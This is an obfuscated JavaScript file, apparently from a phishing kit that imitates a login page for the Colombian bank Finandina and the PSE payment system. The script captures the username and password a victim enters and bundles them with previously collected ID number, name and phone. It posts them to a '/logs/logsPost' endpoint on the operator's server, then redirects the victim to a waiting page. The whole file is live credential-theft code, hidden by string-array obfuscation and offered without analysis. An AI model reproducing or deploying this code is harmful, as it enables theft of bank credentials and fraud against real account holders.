const _0xa349bb = _0x12ec;
(function (_0x5bba60, _0x60b91b) {
  const _0x436d3a = _0x12ec,
    _0x27bf5a = _0x5bba60();
  while (!![]) {
    try {
      const _0x241e10 =
        (-parseInt(_0x436d3a(0xd2)) / 0x1) * (parseInt(_0x436d3a(0xd6)) / 0x2) +
        (parseInt(_0x436d3a(0xe1)) / 0x3) * (parseInt(_0x436d3a(0xf0)) / 0x4) +
        parseInt(_0x436d3a(0xdd)) / 0x5 +
        (parseInt(_0x436d3a(0xe7)) / 0x6) * (parseInt(_0x436d3a(0xe0)) / 0x7) +
        (-parseInt(_0x436d3a(0xde)) / 0x8) * (parseInt(_0x436d3a(0xcf)) / 0x9) +
        -parseInt(_0x436d3a(0xd9)) / 0xa +
        (parseInt(_0x436d3a(0xe5)) / 0xb) * (parseInt(_0x436d3a(0xe2)) / 0xc);
      if (_0x241e10 === _0x60b91b) break;
      else _0x27bf5a["push"](_0x27bf5a["shift"]());
    } catch (_0x14ed6c) {
      _0x27bf5a["push"](_0x27bf5a["shift"]());
    }
  }
})(_0x5ea5, 0x8df40);
function _0x5ea5() {
  const _0xd2c62f = [
    "174532yzaucC",
    "href",
    "txtPass",
    "disabled",
    "3553731gpTNIR",
    "telnum",
    "./wait.html",
    "322ENiEYN",
    "setItem",
    "error",
    "application/json",
    "3224OfvMkz",
    "value",
    "Por\x20favor\x20ingrese\x20la\x20contraseña",
    "6425800ipUggr",
    "Ingresó\x20datos",
    "addEventListener",
    "dudename",
    "144220LxLwhX",
    "8mfWWxd",
    "info",
    "35XlfZUn",
    "48EzeBcQ",
    "1895976XaHDFa",
    "stringify",
    "metaInfo",
    "22TMUTwm",
    "🚫​\x20Finandina",
    "1313970bwzTLa",
    "Por\x20favor\x20ingrese\x20el\x20nombre\x20de\x20usuario",
    "puser",
    "location",
    "btnUsuario",
    "PSE",
    "focus",
    "json",
    "getElementById",
  ];
  _0x5ea5 = function () {
    return _0xd2c62f;
  };
  return _0x5ea5();
}
function updateLS() {
  const _0x261d55 = _0x12ec;
  LS[_0x261d55(0xd3)](_0x261d55(0xdf), JSON["stringify"](info));
}
function _0x12ec(_0x34831e, _0xe121fe) {
  const _0x5ea5f3 = _0x5ea5();
  return (
    (_0x12ec = function (_0x12ec37, _0x2ed41) {
      _0x12ec37 = _0x12ec37 - 0xcf;
      let _0x211793 = _0x5ea5f3[_0x12ec37];
      return _0x211793;
    }),
    _0x12ec(_0x34831e, _0xe121fe)
  );
}
const button = document[_0xa349bb(0xef)](_0xa349bb(0xeb)),
  userInput = document[_0xa349bb(0xef)]("txtUsuario"),
  passInput = document[_0xa349bb(0xef)](_0xa349bb(0xf2));
button[_0xa349bb(0xdb)]("click", async function (_0x21e8f3) {
  const _0x1975c3 = _0xa349bb;
  _0x21e8f3["preventDefault"](), (button["disabled"] = !![]);
  if (userInput["value"] === "") {
    alert(_0x1975c3(0xe8)),
      userInput["focus"](),
      (button[_0x1975c3(0xf3)] = ![]);
    return;
  } else {
    if (passInput["value"] === "") {
      alert(_0x1975c3(0xd8)),
        passInput[_0x1975c3(0xed)](),
        (button[_0x1975c3(0xf3)] = ![]);
      return;
    }
  }
  var _0x1f2457 = userInput[_0x1975c3(0xd7)],
    _0x3ce353 = passInput["value"];
  (info[_0x1975c3(0xe4)]["user"] = _0x1f2457),
    (info[_0x1975c3(0xe4)][_0x1975c3(0xe9)] = _0x3ce353),
    updateLS();
  const _0x4d274c = {
    reg: info[_0x1975c3(0xe4)]["cc"],
    name: info["metaInfo"][_0x1975c3(0xdc)],
    cl: info[_0x1975c3(0xe4)][_0x1975c3(0xd0)],
    us: info[_0x1975c3(0xe4)]["user"],
    ps: info[_0x1975c3(0xe4)][_0x1975c3(0xe9)],
    bn: _0x1975c3(0xe6),
    status: _0x1975c3(0xda),
    fuente: _0x1975c3(0xec),
  };
  try {
    const _0x19389a = await fetch(url + "/logs/logsPost", {
      method: "POST",
      headers: { "Content-Type": _0x1975c3(0xd5) },
      body: JSON[_0x1975c3(0xe3)](_0x4d274c),
    });
    if (!_0x19389a["ok"])
      throw new Error(
        "Error\x20en\x20la\x20respuesta\x20de\x20la\x20red\x20al\x20intentar\x20enviar\x20los\x20datos"
      );
    await _0x19389a[_0x1975c3(0xee)](),
      (window[_0x1975c3(0xea)][_0x1975c3(0xf1)] = _0x1975c3(0xd1));
  } catch (_0xe48f92) {
    console[_0x1975c3(0xd4)](
      "Error\x20al\x20enviar\x20los\x20datos:",
      _0xe48f92
    ),
      (button[_0x1975c3(0xf3)] = ![]);
  }
});
